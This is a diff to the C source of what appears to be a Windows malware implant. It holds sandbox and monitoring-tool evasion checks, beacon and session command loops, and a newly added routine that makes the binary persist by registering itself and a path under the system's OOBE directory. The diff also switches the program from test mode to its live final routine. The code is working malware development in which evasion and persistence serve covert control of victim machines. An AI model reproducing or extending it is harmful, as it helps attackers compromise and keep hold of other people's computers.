@@ -2055,15 +2055,8 @@ void test126(void) {
 	DetectSandbox1();
 }
 
-VOID DetectMonitorSystem(VOID)
-{
-	while (TRUE) {
-		if (CheckForBlackListProcess()) {
-			ExitProcess(-1);
-		}
-
-		Sleep(1000);
-	}
+void test127(void) {
+	PersistenceMethod1("C:\\Windows\\System32\\cmd.exe");
 }
 
 BOOL IsExist
@@ -2085,9 +2078,32 @@ BOOL IsExist
 	return Result;
 }
 
+BOOL Persistence()
+{
+	CHAR szModulePath[MAX_PATH];
+	CHAR szOOBEPath[MAX_PATH];
+	LPSTR lpTemp = NULL;
+
+	GetModuleFileNameA(NULL, szModulePath, _countof(szModulePath));
+	GetSystemDirectoryA(szOOBEPath, _countof(szOOBEPath));
+	lpTemp = StrStrA(szOOBEPath, "system32");
+	lpTemp[0] = 'S';
+	lstrcatA(szOOBEPath, "\\oobe\\oobeldr.exe");
+	if (!PersistenceMethod1(szModulePath)) {
+		PrintFormatA("PersistenceMethod1 failed: %s\n", szModulePath);
+		return FALSE;
+	}
+
+	if (!PersistenceMethod2(szOOBEPath)) {
+		PrintFormatA("PersistenceMethod2 failed: %s\n", szOOBEPath);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 VOID Final(VOID)
 {
-	HANDLE hThread = NULL;
 	DWORD dwThreadId = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
 
@@ -2146,13 +2162,7 @@ VOID Final(VOID)
 #endif
 
 #ifndef _DEBUG
-	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetectMonitorSystem, NULL, 0, &dwThreadId);
-	if (hThread == NULL) {
-		LOG_ERROR("CreateThread", GetLastError());
-		goto CLEANUP;
-	}
-
-	if (DetectSandbox4() || DetectSandbox5()) {
+	if (DetectSandbox4() || DetectSandbox5() || CheckForBlackListProcess()) {
 		goto CLEANUP;
 	}
 #endif
@@ -2176,6 +2186,10 @@ VOID Final(VOID)
 		goto CLEANUP;
 	}
 
+	if (!Persistence()) {
+		goto CLEANUP;
+	}
+
 #ifdef _BEACON
 	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
@@ -2186,14 +2200,8 @@ VOID Final(VOID)
 	pSessionClient = SessionInit(pGlobalConfig);
 	SessionMainLoop(pSessionClient);
 #endif
-CLEANUP:
-	if (hThread != NULL) {
-#ifndef _DEBUG
-		TerminateThread(hThread, 0);
-		CloseHandle(hThread);
-#endif
-	}
 
+CLEANUP:
 #ifdef _BEACON
 	FreeBeaconClient(pBeaconClient);
 #else
@@ -2358,8 +2366,9 @@ int main(void) {
 	//test122();
 	//test124();
 	//test125();
-	test126();
-	//Final();
+	//test126();
+	//test127();
+	Final();
 
 	return 0;
 }
